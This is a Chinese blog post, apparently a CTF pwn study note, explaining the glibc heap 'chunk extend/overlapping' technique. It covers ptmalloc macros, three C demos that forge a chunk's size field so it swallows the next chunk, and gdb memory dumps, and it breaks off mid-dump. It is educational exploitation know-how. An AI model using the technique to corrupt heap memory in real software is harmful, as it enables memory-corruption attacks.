<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Chunk Extend/Overlapping | 堆拓展、重叠 | zhuyuan's Blog</title><meta name="author" content="主元"><meta name="copyright" content="主元"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Chunk Extend&#x2F;Overlapping | 堆拓展、重叠参考资料123https:&#x2F;&#x2F;www.yuque.com&#x2F;cyberangel&#x2F;rg9gdm&#x2F;kgwh10https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;108320408https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43921239&#x2F;article&#x2F;deta">
<meta property="og:type" content="article">
<meta property="og:title" content="Chunk Extend&#x2F;Overlapping | 堆拓展、重叠">
<meta property="og:url" content="https://zhuyuan1213.github.io/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/index.html">
<meta property="og:site_name" content="zhuyuan&#39;s Blog">
<meta property="og:description" content="Chunk Extend&#x2F;Overlapping | 堆拓展、重叠参考资料123https:&#x2F;&#x2F;www.yuque.com&#x2F;cyberangel&#x2F;rg9gdm&#x2F;kgwh10https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;108320408https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43921239&#x2F;article&#x2F;deta">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://w.wallhaven.cc/full/ex/wallhaven-exwgmr.png">
<meta property="article:published_time" content="2023-07-23T16:00:00.000Z">
<meta property="article:modified_time" content="2023-07-24T01:41:57.807Z">
<meta property="article:author" content="主元">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="study">
<meta property="article:tag" content="heap">
<meta property="article:tag" content="Chunk Extend">
<meta property="article:tag" content="Overlapping">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://w.wallhaven.cc/full/ex/wallhaven-exwgmr.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zhuyuan1213.github.io/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Chunk Extend/Overlapping | 堆拓展、重叠',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-07-24 09:41:57'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://w.wallhaven.cc/full/ex/wallhaven-exwgmr.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">zhuyuan's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Chunk Extend/Overlapping | 堆拓展、重叠</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-24T01:41:57.807Z" title="更新于 2023-07-24 09:41:57">2023-07-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Chunk Extend/Overlapping | 堆拓展、重叠"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Chunk-Extend-x2F-Overlapping-堆拓展、重叠"><a href="#Chunk-Extend-x2F-Overlapping-堆拓展、重叠" class="headerlink" title="Chunk Extend&#x2F;Overlapping | 堆拓展、重叠"></a>Chunk Extend&#x2F;Overlapping | 堆拓展、重叠</h1><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.yuque.com/cyberangel/rg9gdm/kgwh10</span><br><span class="line">https://blog.csdn.net/qq_41202237/article/details/108320408</span><br><span class="line">https://blog.csdn.net/weixin_43921239/article/details/107841328</span><br></pre></td></tr></table></figure>

<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>chunk extend技术能够产生的原因在于ptmalloc在对堆chunk进行操作时使用的各种宏。</p>
<p>在ptmalloc中，<strong>获取chunk块大小</strong>的操作如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure>

<p>一种是直接获取chunk的大小，不忽略掩码部分，另一种是忽略掩码部分。</p>
<p>在ptmalloc中，<strong>获取下一chunk块地址</strong>的操作如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure>

<p>即使用当前块指针加上当前块的大小。</p>
<p>在ptmalloc中，<strong>获取前一个chunk信息</strong>的操作如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure>

<p>即通过malloc_chunk-&gt;prev_size获取前一块大小，然后使用本chunk地址减去所得大小。</p>
<p>在ptmalloc，<strong>判断当前chunk是否是use状态</strong>的操作如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((<span class="type">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure>

<p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p>
<h3 id="漏洞利用的必要条件"><a href="#漏洞利用的必要条件" class="headerlink" title="漏洞利用的必要条件"></a>漏洞利用的必要条件</h3><p>chunk extend是堆漏洞的一种常见利用手法，通过extend可以实现chunk overlapping（块重叠）的效果。这种利用方法需要以下的时机和条件：</p>
<ul>
<li>程序中存在基于堆的漏洞</li>
<li>漏洞可以控制chunk header中的数据</li>
</ul>
<h3 id="基本示例1：对inuse的fastbin进行extend"><a href="#基本示例1：对inuse的fastbin进行extend" class="headerlink" title="基本示例1：对inuse的fastbin进行extend"></a>基本示例1：对inuse的fastbin进行extend</h3><p>源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g test1.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为在编译阶段使用了“-g”参数，可以使用gdb在任意行下断点<code>b + 行号</code>。首先在第8行下断点，我们看一下完成两次堆分配之后在内存中的布局：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为堆块的结构分为prev_size、size、块内容，拿上面这个64位程序举例：malloc(0x10)其中的0x10指得是内容部分申请0x10大小的空间，，prev_size和size部分各占8个字节，size记录的是整个堆块的大小，并且size的最后一位用来记录前一个块的状态，所以</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">size</span> = <span class="number">0</span>x8(prev_size) + <span class="number">0</span>x8(size) + <span class="number">0</span>x10(内容) + <span class="number">0</span>x1(标志位) = <span class="number">0</span>x21</span><br></pre></td></tr></table></figure>

<p>可以看到第一个申请的0x10的chunk1在<strong>0x602000</strong>位置，size为0x21。第二个申请的0x10的chunk2在0x602020的位置，size为0x21。接下来我们在第9行下断点b 9执行***(long long *)((long long)hollk - 0x8) &#x3D; 0x41**，依然还是在这个位置看两个块有什么变化:</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0</span>x00000<span class="number">00000000000</span>  <span class="number">0</span>x00000<span class="number">00000000041</span> &lt;=== 篡改大小 &lt;=== chunk <span class="number">1</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0</span>x00000<span class="number">00000000000</span>  <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0</span>x00000<span class="number">00000000000</span>  <span class="number">0</span>x00000<span class="number">00000000021</span>&lt;=== chunk <span class="number">2</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0</span>x00000<span class="number">00000000000</span>  <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0</span>x00000<span class="number">00000000000</span>  <span class="number">0</span>x0000000000020fc1 &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<p>***(long long *)((long long)hollk - 0x8) &#x3D; 0x41**，这段代码的意思是将，chunk1地址减0x8的位置修改成0x41，也就是说chunk1的size从0x21被修改成0x41。chunk1的空间变大了 ，但是chunk2就遭殃了，因为chunk1延展的空间正好是chunk2的空间，chunk2被chunk1包含占有了。接下来我们把断点下在第10行b 10：<br><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720153850237.png" alt="image-20230720153850237"></p>
<p>在执行完free(hollk)；这段代码之后chunk1被释放，可以看到chunk1和chunk2被合并成一个0x40的chunk放进fastbin中。最后我们重新申请一个大小为0x30的chunk时，fastbin中刚好有合适的大小块，这个时候chunk1与chunk2合并的chunk就会重新被启用，启用的同时原有chunk2中的内容也会连带着被启用，这个时候就可以直接通过这个新申请的块来对chunk2中的内容进行操作了</p>
<h3 id="基本示例-2：对-inuse-的-smallbin-进行-extend"><a href="#基本示例-2：对-inuse-的-smallbin-进行-extend" class="headerlink" title="基本示例 2：对 inuse 的 smallbin 进行 extend"></a>基本示例 2：对 inuse 的 smallbin 进行 extend</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并的chunk3</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720154136515.png" alt="image-20230720154136515"></p>
<p>接下来我们在第10行下断点，执行<code>*(int *)((int)hollk-0x8) = 0xb1;</code>这段代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 篡改size域</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== 防止合并的chunk</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<p>和前面的例子一样，***(int *)((int)hollk-0x8) &#x3D; 0xb1**。这段代码也是将chunk1的size部分进行了更改，将原有的0x90扩展到了0xb0。这就导致了chunk2被chunk1所包含。接下来我们在第11行下断点释放chunk1：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720154259690.png" alt="image-20230720154259690"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== 被放入unsorted bin</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x00000000000000b0  0x0000000000000020 &lt;=== 注意此处标记为空</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</span><br><span class="line">[+] unsorted_bins[0]: fw=0x602000, bk=0x602000</span><br><span class="line"> →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure>

<p>这里解释一下为什么进的是unsortbin，有两种情况下进unsortbin：</p>
<ul>
<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中</li>
<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</li>
</ul>
<p>那么这个例子就满足第二种情况，不属于fastbin中的空闲块，并且不和top chunk相邻。其实这个例子和第一个例子差不多，因为chunk1和chunk2合并之后的chunk的大小超过了fast bin的最大接收值，所以不进fast bin，并且chunk3的size标志位变成了0，证明前一个块chunk2是一个释放的状态。接下来的过程也是一样的，再次申请一个0xa0大小的chunk时，会从unsort bin中提取。连带着chunk2中的内容也会被提取出来，这样一来再次对chunk1进行操作，从而达到操作chunk2的目的</p>
<h3 id="基本示例-3：对-free-的-smallbin-进行-extend"><a href="#基本示例-3：对-free-的-smallbin-进行-extend" class="headerlink" title="基本示例 3：对 free 的 smallbin 进行 extend"></a>基本示例 3：对 free 的 smallbin 进行 extend</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">int</span> *)((<span class="type">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第三个例子和前面两个有一些区别，前面两个都是先修改chunk1的size大小然后进行释放，但是这个例子是先进行释放，然后重新修改chunk1的size大小，依然还是一步一步来，首先在第8行下断点，使程序完成申请chunk的操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51</span><br></pre></td></tr></table></figure>

<p>接下来我们在第9行下断点，使程序完成对chunk1的释放：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">     unsorted_bins[0]: fw=0x602000, bk=0x602000</span><br><span class="line"> →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)</span><br><span class="line"></span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== 进入unsorted bin</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:  